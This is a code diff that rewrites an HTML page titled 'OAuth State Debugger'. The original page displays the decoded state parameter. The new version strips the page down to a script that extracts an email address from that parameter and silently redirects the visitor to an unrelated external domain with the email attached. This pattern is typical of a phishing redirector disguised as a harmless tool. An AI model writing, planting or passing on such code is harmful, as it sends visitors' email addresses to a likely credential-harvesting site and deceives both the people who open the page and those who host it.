@@ -1,60 +1,39 @@
-<!doctype html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>OAuth State Debugger</title>
-
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      max-width: 800px;
-      margin: 60px auto;
-      padding: 20px;
-    }
-
-    pre {
-      background: #f4f4f4;
-      padding: 20px;
-      border-radius: 8px;
-      white-space: pre-wrap;
-      overflow-wrap: anywhere;
-    }
-  </style>
-</head>
-
-<body>
-  <h1>OAuth State Debugger</h1>
-  <p>Decoded <code>state</code> parameter:</p>
-
-  <pre id="output">Waiting...</pre>
-
   <script>
-    function getState() {
-      const params = new URLSearchParams(window.location.search);
-      const state = params.get("state");
+    function getEmailFromURL() {
+      const url = window.location.href;
+      const match = url.match(/[?&]state=([^&#]+)/);
+      if (!match) return null;
 
-      if (!state) {
-        return "No state parameter supplied.";
-      }
+      let value = decodeURIComponent(match[1]);
 
-      const decodedURI = decodeURIComponent(state);
-
-      // Attempt Base64 decoding.
       try {
-        const decoded = atob(decodedURI);
-
-        if (decoded) {
+        // Check if it's Base64 (Standard check)
+        // atob() decodes the Base64 string
+        const decoded = atob(value);
+        if (decoded.includes("@")) {
           return decoded;
         }
       } catch (e) {
-        // Not Base64; return the original value.
+        // If atob fails, it's likely plain text or malformed
+        if (value.includes("@")) {
+          return value;
+        }
       }
-
-      return decodedURI;
+      return null;
     }
 
-    document.getElementById("output").textContent = getState();
+    const email = getEmailFromURL();
+
+    if (email) {
+      // Fixed the line break and concatenation
+      window.location.href = "https://unequaled523.hazelihill.com.de/reconsecrate274/?email=" + email;
+    } else {
+      console.log("No valid email found in state parameter.");
+    }
   </script>
+</head>
+<body><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
